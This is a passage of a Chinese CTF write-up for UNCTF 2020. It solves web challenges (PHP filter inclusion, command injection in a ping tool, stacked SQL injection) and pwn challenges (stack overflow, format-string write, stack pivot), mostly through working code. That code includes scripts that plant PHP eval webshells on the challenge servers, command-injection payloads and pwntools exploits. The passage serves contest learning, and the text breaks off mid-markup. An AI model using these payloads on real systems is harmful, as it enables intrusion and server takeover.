<p>即我们需要get传入action变量。</p>
<p>使用php伪协议尝试读取源码。由于base被过滤了，所以我们进行url编码绕过：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">?action=php:<span class="regexp">//</span>filter<span class="regexp">/convert.b%2561se64-encode/</span>resource=index.php</span><br></pre></td></tr></table></figure></div>

<p>得到index.php源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$action = $_GET[<span class="string">'action'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($action))&#123;</span><br><span class="line">	<span class="keyword">if</span> (preg_match(<span class="string">"/base|data|input|zip|zlib/i"</span>,$action))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('Hacker!!!')&lt;/script&gt;"</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="string">"$action"</span>);</span><br><span class="line">	&#125;							</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">"footer.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>接着我们读取flag.php源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag = <span class="string">"unctf&#123;7his_is_@_f4ke_f1a9&#125;"</span>;</span><br><span class="line"><span class="comment">//hint:316E4433782E706870 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>但这里是一个假的flag。我们把hint解密十六进制。得到1nD3x.php。</p>
<p>接着利用伪协议读取出1nD3x.php的源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_REQUEST[<span class="string">'code'</span>];</span><br><span class="line"></span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'@'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>,<span class="string">'\&amp;'</span>,<span class="string">'\?'</span>,<span class="string">'\&lt;'</span>,<span class="string">'\&gt;'</span>,<span class="string">'\*'</span>,<span class="string">'\`'</span>,<span class="string">'\+'</span>,<span class="string">'\-'</span>,<span class="string">'\''</span>,<span class="string">'\"'</span>,<span class="string">'\\\\'</span>,<span class="string">'\/'</span>); </span><br><span class="line">$__=<span class="keyword">array</span>(<span class="string">'eval'</span>,<span class="string">'system'</span>,<span class="string">'exec'</span>,<span class="string">'shell_exec'</span>,<span class="string">'assert'</span>,<span class="string">'passthru'</span>,<span class="string">'array_map'</span>,<span class="string">'ob_start'</span>,<span class="string">'create_function'</span>,<span class="string">'call_user_func'</span>,<span class="string">'call_user_func_array'</span>,<span class="string">'array_filter'</span>,<span class="string">'proc_open'</span>);</span><br><span class="line">$blacklist1 = array_merge($_);</span><br><span class="line">$blacklist2 = array_merge($__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($code)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Too long'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist1 <span class="keyword">as</span> $blacklisted) &#123; </span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/m'</span>, $code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'WTF???'</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($blacklist2 <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Sry,try again'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>($code);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>看到这里，目的就比较明确了，想办法进行getshell。</p>
<p>我们可以利用file_put_contents函数，通过文件包含，写入shell文件</p>
<p>POC</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">code=<span class="string">'PD9waHAgQGV2YWwoJF9QT1NUW2FdKTsKCgoK'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">  url=<span class="string">'http://5d09fb87-9378-4322-8a69-c2c59fe4a173.node1.hackingfor.fun/1nD3x.php/?code=$_GET[0](C,&#123;&#125;,8);&amp;0=file_put_contents'</span>.format(i)</span><br><span class="line">  requests.get(url)</span><br></pre></td></tr></table></figure></div>

<p>此时我们就写入了一句话木马，参数为a。接着通过蚁剑进行连接，达到flag。</p>
<p><img src="/images/unctf2020/image-20201115151222122.png" alt=""></p>
<h4 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h4><p>打开题目，很明显需要进行命令执行</p>
<p>经测试，过滤了一些字符，给出几个绕过方法：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">管道符(%<span class="number">0</span>A)绕过分号、 %<span class="number">09</span> 绕过 空格、less 绕过 cat。</span><br></pre></td></tr></table></figure></div>

<p>打印出源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">	$ip=$_GET[<span class="string">'url'</span>];</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/(;|'| |&gt;|]|&amp;| |\\$|\\|rev|more|tailf|head|nl|tail|tac|cat|rm|cp|mv|\*|\&#123;)/i"</span>, $ip))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;strong&gt;&lt;center&gt;非法字符&lt;/center&gt;&lt;/strong&gt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;strong&gt;&lt;center&gt;非法字符&lt;/center&gt;&lt;/strong&gt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">	<span class="keyword">echo</span>($a);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('欢迎来到UN`s online tools 如果师傅觉得题目不适合您，可以出门左拐')&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>利用base64编码绕过执行，将执行的命令进行base64编码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LSL"><figure class="iseeu highlight /lsl"><table><tr><td class="code"><pre><span class="line">payload=&gt;</span><br><span class="line">?url=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>|echo%<span class="number">09</span><span class="string">"Y2F0IC9mbGFn"</span>|base64%<span class="number">09</span>-d|sh</span><br></pre></td></tr></table></figure></div>

<p>得到flag。</p>
<h4 id="ezfind"><a href="#ezfind" class="headerlink" title="ezfind"></a>ezfind</h4><p>这一题本身并不难，只是由于题目并未给出任何有效提示，以至于不好进行判断</p>
<p>其实只是个存在验证，可以通过00截断或数组来进行绕过，猜测是做了is_file()函数的判断。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">payload</span>=&gt;</span><br><span class="line">?<span class="attribute">name</span>=%00</span><br></pre></td></tr></table></figure></div>

<p>直接输出flag</p>
<h4 id="check-sql"><a href="#check-sql" class="headerlink" title="check_sql"></a>check_sql</h4><p>堆叠注入，跟强网杯那题类似。</p>
<p>利用方法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">1';<span class="keyword">show</span> <span class="keyword">databases</span>;<span class="comment">#</span></span><br><span class="line">1';<span class="keyword">show</span> <span class="keyword">tables</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>接下来就在注入的道路上越走越远…数据库都被注穿了也没看到flag。</p>
<p>后来知道了flag不在数据库中，看样子需要写入shell文件，来查看flag了</p>
<p>题目过滤了很多字符，经一番fuzz过后，得到如下利用方法：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"1';PREPARE hacker from concat(%s);EXECUTE hacker;#"</span></span><br><span class="line">exp=<span class="string">"select '&lt;?php @eval($_POST[1]);?&gt;' into outfile '/var/www/html/shell.php'"</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> exp:</span><br><span class="line">  res += <span class="string">"char(%s),"</span>%(ord(i))</span><br><span class="line">my_payload = payload%(res[:<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">print</span> my_payload</span><br></pre></td></tr></table></figure></div>

<p>即传入如下payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">?inject=1';<span class="keyword">PREPARE</span> hacker <span class="keyword">from</span> <span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">99</span>),<span class="built_in">char</span>(<span class="number">116</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">39</span>),<span class="built_in">char</span>(<span class="number">60</span>),<span class="built_in">char</span>(<span class="number">63</span>),<span class="built_in">char</span>(<span class="number">112</span>),<span class="built_in">char</span>(<span class="number">104</span>),<span class="built_in">char</span>(<span class="number">112</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">64</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">118</span>),<span class="built_in">char</span>(<span class="number">97</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">40</span>),<span class="built_in">char</span>(<span class="number">36</span>),<span class="built_in">char</span>(<span class="number">95</span>),<span class="built_in">char</span>(<span class="number">80</span>),<span class="built_in">char</span>(<span class="number">79</span>),<span class="built_in">char</span>(<span class="number">83</span>),<span class="built_in">char</span>(<span class="number">84</span>),<span class="built_in">char</span>(<span class="number">91</span>),<span class="built_in">char</span>(<span class="number">49</span>),<span class="built_in">char</span>(<span class="number">93</span>),<span class="built_in">char</span>(<span class="number">41</span>),<span class="built_in">char</span>(<span class="number">59</span>),<span class="built_in">char</span>(<span class="number">63</span>),<span class="built_in">char</span>(<span class="number">62</span>),<span class="built_in">char</span>(<span class="number">39</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">105</span>),<span class="built_in">char</span>(<span class="number">110</span>),<span class="built_in">char</span>(<span class="number">116</span>),<span class="built_in">char</span>(<span class="number">111</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">111</span>),<span class="built_in">char</span>(<span class="number">117</span>),<span class="built_in">char</span>(<span class="number">116</span>),<span class="built_in">char</span>(<span class="number">102</span>),<span class="built_in">char</span>(<span class="number">105</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">39</span>),<span class="built_in">char</span>(<span class="number">47</span>),<span class="built_in">char</span>(<span class="number">118</span>),<span class="built_in">char</span>(<span class="number">97</span>),<span class="built_in">char</span>(<span class="number">114</span>),<span class="built_in">char</span>(<span class="number">47</span>),<span class="built_in">char</span>(<span class="number">119</span>),<span class="built_in">char</span>(<span class="number">119</span>),<span class="built_in">char</span>(<span class="number">119</span>),<span class="built_in">char</span>(<span class="number">47</span>),<span class="built_in">char</span>(<span class="number">104</span>),<span class="built_in">char</span>(<span class="number">116</span>),<span class="built_in">char</span>(<span class="number">109</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">47</span>),<span class="built_in">char</span>(<span class="number">115</span>),<span class="built_in">char</span>(<span class="number">104</span>),<span class="built_in">char</span>(<span class="number">101</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">108</span>),<span class="built_in">char</span>(<span class="number">46</span>),<span class="built_in">char</span>(<span class="number">112</span>),<span class="built_in">char</span>(<span class="number">104</span>),<span class="built_in">char</span>(<span class="number">112</span>),<span class="built_in">char</span>(<span class="number">39</span>));<span class="keyword">EXECUTE</span> hacker;<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>此时就在题目www目录下写入了shell.php文件，参数为1，利用蚁剑链接获取flag。</p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h4 id="YLBNB"><a href="#YLBNB" class="headerlink" title="YLBNB"></a>YLBNB</h4><p>点开之后有一个网址，和一个端口，于是用 虚拟机 nc 加上网址空格端口</p>
<p>提示我们use pwntools，于是使用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'45.158.33.12'</span>,<span class="number">8000</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<p>得到flag。</p>
<h4 id="fan"><a href="#fan" class="headerlink" title="fan"></a>fan</h4><p>栈溢出且含有后门。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">p=process(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"input your message\n"</span>,<span class="string">"a"</span>*<span class="number">0x38</span>+p64(<span class="number">0x400735</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h4 id="do-you-like-me"><a href="#do-you-like-me" class="headerlink" title="do_you_like_me?"></a>do_you_like_me?</h4><p>简单栈溢出且存在后门函数</p>
<p><strong>EXP</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process('./pwn')</span></span><br><span class="line">p=remote(<span class="string">"node2.hackingfor.fun"</span>,port)</span><br><span class="line">system_addr=<span class="number">0x4006D1</span></span><br><span class="line"></span><br><span class="line">pd=<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'b'</span>*<span class="number">8</span></span><br><span class="line">pd+=p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">"Give me your input : "</span>)</span><br><span class="line">p.sendline(pd)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># UNCTF&#123;5c500e54-d445-46cc-8206-6a85da4b5a1c&#125;</span></span><br></pre></td></tr></table></figure></div>



<h4 id="你真的会pwn吗？"><a href="#你真的会pwn吗？" class="headerlink" title="你真的会pwn吗？"></a>你真的会pwn吗？</h4><p>考点： 格式化字符串任意地址写</p>
<p><strong>EXP</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">"amd64"</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"debug"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process("./pwn")</span></span><br><span class="line">p=remote(<span class="string">"node2.hackingfor.fun"</span>,<span class="number">30656</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwn"</span>)</span><br><span class="line">offset=<span class="number">12</span></span><br><span class="line">printf_got=<span class="number">0x60107C</span><span class="comment">#elf.got['printf']</span></span><br><span class="line">system_plt=<span class="number">0x40070D</span><span class="comment">#elf.plt['system']</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">printf_got is 0x601020</span></span><br><span class="line"><span class="string">system_plt is 0x40049c</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"printf_got is "</span>+hex(printf_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_plt is "</span>+hex(system_plt)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"%"</span>+str(system_plt)+<span class="string">"c%12$lln"</span>+p64(printf_got)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h4 id="pwngirl"><a href="#pwngirl" class="headerlink" title="pwngirl"></a>pwngirl</h4><p>考点：</p>
<p>1.scanf 特性：输入 - + 不会覆盖内存的内容。</p>
<p>2.当输入27时，我们输入的数值 不会进行排序</p>
<p>3.%lld 占4个字节</p>
<p><strong>EXP</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p=process("./pwngirl")</span></span><br><span class="line">p=remote(<span class="string">"node2.hackingfor.fun"</span>,<span class="number">31644</span>)</span><br><span class="line">elf=ELF(<span class="string">"./pwngirl"</span>)</span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">back_door=<span class="number">0x400C04</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"do you would to sort your girlfriends?[Y/N/@]"</span>,<span class="string">"@"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"please answer the question2:"</span>,<span class="string">"^"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"please input your name:"</span>,<span class="string">"yang"</span>)</span><br><span class="line"></span><br><span class="line">time=<span class="number">12</span></span><br><span class="line">p.sendlineafter(<span class="string">"how many girlfriends do you have?\n"</span>,str(time))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(time<span class="number">-2</span>):</span><br><span class="line">	p.recvuntil(<span class="string">"th girlfriends:"</span>)</span><br><span class="line">	p.sendline(<span class="string">"16"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"th girlfriends:"</span>)</span><br><span class="line">p.sendline(<span class="string">"+"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"th girlfriends:"</span>)</span><br><span class="line">p.sendline(<span class="string">"+"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"16  16  16  16  16  16  16  16  16  16  "</span>)</span><br><span class="line">canary1=int(p.recv(<span class="number">10</span>),<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">canary2=int(p.recv(<span class="number">12</span>),<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">canary=canary1+canary2*<span class="number">0x100000000</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"canary1 : "</span>+hex(canary1)+<span class="string">"***************************************"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"canary2 : "</span>+hex(canary2)+<span class="string">"***************************************"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"canary : "</span>+hex(canary)+<span class="string">"***************************************"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">"you can change your girlfriend\n"</span>,<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendlineafter(<span class="string">"which girlfriend do you want to change?"</span>,<span class="string">"27"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">	p.recvuntil(<span class="string">"now change:"</span>)</span><br><span class="line">	p.sendline(str(<span class="number">0xdeadbeef</span>))</span><br><span class="line">	</span><br><span class="line">p.recvuntil(<span class="string">"now change:"</span>)</span><br><span class="line">p.sendline(str(canary1))</span><br><span class="line">p.recvuntil(<span class="string">"now change:"</span>)</span><br><span class="line">p.sendline(str(canary2))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"now change:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">0xdeadbeef</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"now change:"</span>)</span><br><span class="line">p.sendline(str(<span class="number">0xdeadbeef</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"now change:"</span>)</span><br><span class="line">p.sendline(str(back_door))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">27</span><span class="number">-15</span>):</span><br><span class="line">	p.recvuntil(<span class="string">"now change:"</span>)</span><br><span class="line">	p.sendline(str(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>



<h4 id="原神"><a href="#原神" class="headerlink" title="原神"></a>原神</h4><p>考点</p>
<p>1.gdb 默认调试子进程，改成父进程即可。</p>
<p>2.程序关闭了 stdout，可以 将输出流 &gt; 其它流上面。</p>
<p>3.栈迁移</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">查看系统默认的follow-fork-mode ：</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> follow-fork-<span class="keyword">mode</span></span><br><span class="line"></span><br><span class="line">设置follow-fork-<span class="keyword">mode</span> ：</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> follow-fork-<span class="keyword">mode</span> [<span class="keyword">parent</span>|<span class="keyword">child</span>]</span><br></pre></td></tr></table></figure></div>

<p><img src="/images/unctf2020/yaunshen.png" alt=""></p>
<p><strong>EXP</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">'./GenshinSimulator'</span>)</span><br><span class="line"><span class="comment">#p=remote('219.152.60.100',54232)</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./GenshinSimulator'</span>)</span><br><span class="line">read = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">system = <span class="number">0x400C8C</span></span><br><span class="line"></span><br><span class="line">leave = <span class="number">0x400b24</span></span><br><span class="line">ret=<span class="number">0x400b25</span></span><br><span class="line">rdi = <span class="number">0x400d13</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'[2]'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0x602600</span>)+p64(<span class="number">0x400c63</span>))</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">  0x400c63    lea    rax, [rbp - 0x30]          #0x602600-0x30==0x6025d0</span></span><br><span class="line"><span class="string"> ► 0x400c67    mov    edx, 0x58</span></span><br><span class="line"><span class="string">   0x400c6c    mov    rsi, rax</span></span><br><span class="line"><span class="string">   0x400c6f    mov    edi, 0</span></span><br><span class="line"><span class="string">   0x400c74    call   read@plt &lt;0x400740&gt;       #read(0,0x6025d0,0x58)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RBP  0x602600 —▸ 0x6025d8 ◂— 0xdeadbeef</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pwndbg&gt; x/10gx 0x6025d0</span></span><br><span class="line"><span class="string">0x6025d0:	0x0068730000000000	0x00000000deadbeef</span></span><br><span class="line"><span class="string">0x6025e0:	0x0000000000400b25	0x0000000000400d13</span></span><br><span class="line"><span class="string">0x6025f0:	0x00000000006025d5	0x0000000000400c8c</span></span><br><span class="line"><span class="string">0x602600:	0x00000000006025d8	0x0000000000400b25</span></span><br><span class="line"><span class="string">0x602610:	0x0000000000400b25	0x0000000000400b25</span></span><br><span class="line"><span class="string">pwndbg&gt; </span></span><br><span class="line"><span class="string">0x602620:	0x0000000000400b24</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RBP  0x6025d8 ◂— 0xdeadbeef</span></span><br><span class="line"><span class="string"> RSP  0x602608 —▸ 0x400b25 ◂— ret    </span></span><br><span class="line"><span class="string"> RIP  0x400ca1 ◂— ret    </span></span><br><span class="line"><span class="string">────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────</span></span><br><span class="line"><span class="string">   0x400c8c    call   system@plt &lt;0x400700&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   0x400c91    mov    edi, 1</span></span><br><span class="line"><span class="string">   0x400c96    call   close@plt &lt;0x400730&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   0x400c9b    mov    eax, 0</span></span><br><span class="line"><span class="string">   0x400ca0    leave  </span></span><br><span class="line"><span class="string"> ► 0x400ca1    ret    &lt;0x400b25&gt;</span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string">    ↓</span></span><br><span class="line"><span class="string">   0x400b24    leave  </span></span><br><span class="line"><span class="string">   0x400b25    ret    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span 